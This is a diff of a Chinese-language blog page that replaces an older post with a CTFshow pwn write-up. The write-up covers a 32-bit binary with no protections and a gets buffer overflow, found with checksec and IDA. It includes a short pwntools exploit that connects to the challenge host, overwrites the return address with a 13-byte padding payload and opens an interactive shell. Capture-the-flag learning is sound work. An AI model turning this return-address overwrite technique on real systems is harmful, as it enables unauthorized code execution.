@@ -6,7 +6,7 @@
   <meta http-equiv="cache-control" content="no-cache">
   <meta http-equiv="expires" content="0">
   
-  <title>PWN-File Descriptor | Hustler&#39;s Blog</title>
+  <title>PWN-StackOverflow | Hustler&#39;s Blog</title>
   <meta name="author" content="Hustler">
   
   <meta name="description" content="Everybody needs love,but hacker dont">
@@ -14,7 +14,7 @@
   
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
-  <meta property="og:title" content="PWN-File Descriptor"/>
+  <meta property="og:title" content="PWN-StackOverflow"/>
   <meta property="og:site_name" content="Hustler&#39;s Blog"/>
 
   
@@ -112,7 +112,7 @@
 
 	
 		<div class="page-header">
-			<h1> PWN-File Descriptor</h1>
+			<h1> PWN-StackOverflow</h1>
 		</div>
 	
 
@@ -129,7 +129,14 @@
 	  		
 
 	  <p>来源CTFshow</p>
-<h1 id="检查安全设置和类型"><a href="#检查安全设置和类型" class="headerlink" title="检查安全设置和类型"></a>检查安全设置和类型</h1><p>拿到先放到checksec里面检查安全设置，在放到file里面看看类型：</p>
+<h1 id="检查安全设置和类型"><a href="#检查安全设置和类型" class="headerlink" title="检查安全设置和类型"></a>检查安全设置和类型</h1><p>拿到先放到checksec里面检查安全设置和类型：<br><img src="/images/ctfshowpwn02/1.JPG"><br>可以看到没有开启保护，并且是32位小端序</p>
+<h1 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h1><p>丢进ida，发现get函数，直接检查，发现s这个字符串长度为九个字节，但是函数却允许输入50个字节，直接点击s可以进入下图界面检查：<br><img src="/images/ctfshowpwn02/2.JPG"><br>可以看到，从s的首地址00000000（相对）处开辟了九个字节的空间，即到-00000009，又因为栈是向下生长（向着正生长），而且get允许输入超过九个字节的字符，我们就可以覆盖r处的返回地址<br>查看stack函数的地址为0x804850F，所以有payload和exp如下：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span> <span class="token comment"># 引入pwntools</span>
+p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"pwn.challenge.ctf.show"</span><span class="token punctuation">,</span><span class="token number">28245</span><span class="token punctuation">)</span> <span class="token comment"># 连接远程</span>
+payload<span class="token operator">=</span><span class="token string">b"a"</span><span class="token operator">*</span><span class="token number">13</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x804850F</span><span class="token punctuation">)</span> <span class="token comment"># b'a'*13用于覆盖9+4=13个字节，p32函数则构造了stack的返回地址</span>
+p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span> <span class="token comment"># 发送payload</span>
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 交给用户操作（提供交互shell）</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>得到shell后即可查看flag文件</p>
 
 	  <div class="article-footer-copyright">
 
@@ -147,13 +154,12 @@
 
     
     
-    <a href="/2023/08/28/webxxe/" type="button" class="btn btn-default"><i
-                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
     
 
     <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
     
-    <a href="/2023/08/27/pwnfd/" type="button" class="btn btn-default ">Next<i
+    <a href="/2024/12/19/OSCP-symfonos2/" type="button" class="btn btn-default ">Next<i
                 class="fa fa-arrow-circle-o-right"></i></a>
     
 
@@ -187,7 +193,7 @@
 	
 	<div class="meta-widget">
 	<i class="fa fa-clock-o"></i>
-	2023-08-27 
+	2024-12-20 
 	</div>
 	
 
